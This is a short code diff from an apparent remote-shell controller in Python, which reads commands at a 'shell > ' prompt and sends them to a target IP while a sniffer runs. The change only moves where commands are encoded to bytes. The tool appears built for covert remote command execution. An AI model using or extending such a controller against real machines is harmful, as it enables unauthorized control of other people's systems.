@@ -59,13 +59,13 @@ class Controller(Host):
 
         while True:
             if not shell_lock.value:
-                cmd = input(colored("shell > ", "red")).encode()
+                cmd = input(colored("shell > ", "red"))
                 shell_lock.value = True
-                if cmd == b'exit':
+                if cmd == "exit":
                     sniffer.kill()
                     break
                 elif len(cmd) != 0 and not self.filter_commands(cmd):
-                    self.send(target['ip'], "instruction", cmd)
+                    self.send(target['ip'], "instruction", cmd.encode())
         
     def instruction(self, shellpack):
         if shellpack['option'] == "TRUNCATED":
